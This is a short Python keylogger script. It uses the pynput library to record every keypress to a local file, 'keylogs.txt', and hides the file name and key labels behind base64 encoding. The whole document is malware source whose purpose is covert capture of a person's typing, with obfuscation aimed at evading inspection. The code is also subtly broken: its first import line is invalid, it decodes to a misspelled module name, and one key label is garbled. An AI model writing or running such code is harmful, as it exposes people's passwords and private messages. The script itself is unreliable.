import __import__('base64').b64decode('cHlub3V0')

k = __import__('pynput').keyboard

def on_press(key):
    try:
        with open(__import__('base64').b64decode('a2V5bG9ncy50eHQ=').decode(), 'a') as f:
            f.write(str(key.char))
    except AttributeError:
        if key == k.Key.space:
            with open(__import__('base64').b64decode('a2V5bG9ncy50eHQ=').decode(), 'a') as f:
                f.write(__import__('base64').b64decode('W1NBUENFXT0=').decode())
        elif key == k.Key.enter:
            with open(__import__('base64').b64decode('a2V5bG9ncy50eHQ=').decode(), 'a') as f:
                f.write(__import__('base64').b64decode('W0VOVEVSXQo=').decode())
        elif key == k.Key.backspace:
            with open(__import__('base64').b64decode('a2V5bG9ncy50eHQ=').decode(), 'a') as f:
                f.write(__import__('base64').b64decode('W0JBQ0tTUEFDRV0=').decode())
        elif key == k.Key.tab:
            with open(__import__('base64').b64decode('a2V5bG9ncy50eHQ=').decode(), 'a') as f:
                f.write(__import__('base64').b64decode('W1RBVF0=').decode())
        else:
            with open(__import__('base64').b64decode('a2V5bG9ncy50eHQ=').decode(), 'a') as f:
                f.write(f'[{key.name.upper()}]')
def on_release(key):
    if key == k.Key.esc:
        return False
with k.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()